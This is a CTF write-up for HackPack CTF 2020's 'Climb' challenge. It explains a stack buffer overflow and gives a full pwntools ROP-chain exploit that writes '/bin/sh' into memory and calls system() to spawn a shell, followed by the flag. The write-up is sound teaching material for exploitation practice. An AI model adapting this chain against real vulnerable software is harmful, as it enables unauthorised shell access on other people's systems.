<h1>Climb</h1>
<h2>HackPack CTF 2020 PWN</h2>

<h3>Problem:</h3>
"Can you help me climb the rope?"

<h3>Solution:</h3>
Based on the problem, the first thing we are looking for is a buffer overflow vulnerability that can allow us to ROP.

After looking at the binary through Ghidra, we notice that main reads 500 bytes into a 32 byte variable.

![Image of Main](https://github.com/h3lpful/ctf_writeups/blob/master/climb/images/main.PNG)

We can take a look with checksec and we get:

![image of checksec](https://github.com/h3lpful/ctf_writeups/blob/master/climb/images/checksec.PNG)

So we have no canary to worry about, and no PIE so we can hard code function addresses, and system() is already resolved for us in the binary, so there is no need to ret to libc.

First, since system() requires a pointer loaded on the RDI we need to write to a memory address that we can call later.  Using vmmap with pwndbg we can see that the range 0x601000 to 0x602000 is set for both read and write.

![image of checksec](https://github.com/h3lpful/ctf_writeups/blob/master/climb/images/vmmap.PNG)

Looking in Ghidra the higher areas of that should not be used so I chose (0x601fb0).

Next we need to be able to write to that area.  We can use ROPgadget > dump.txt to browse through all the available gadgets and build a ROP chain, here is a good one:

0x000000000040065d : mov qword ptr \[rdx\], rax ; ret

will allow us to write from the rax to the location on the rdx.

The only thing left is to build the payload.  Below is the exploit code I used:

```Python3
from pwn import *

target = './climb'

context.update(terminal = ['tmux','splitw'])

#==========================================================
#           CODE
#==========================================================

p = process(target)

#p = remote('cha.hackpack.club',41702)

sh = b'/bin/sh\0'
sh = int.from_bytes(sh, byteorder='little')

#gdb.attach(p)

pl = p64(0x4141414141414141) * 5    # padding to ret addr
pl += p64(0x40064b)                 # pop rax
pl += p64(sh)                       # /bin/sh into rax
pl += p64(0x400654)                 # pop rdx
pl += p64(0x601fb0)                 # address on data
pl += p64(0x40065d)                 # writes rax to address on rdx
pl += p64(0x400743)                 # pop rdi
pl += p64(0x601fb0)                 # address in data
pl += p64(0x400530)                 # call system()

print(p.recvuntil('respond?'))
p.send(pl)
p.interactive()
```

flag{w0w_A_R34L_LiF3_R0pp3r!}
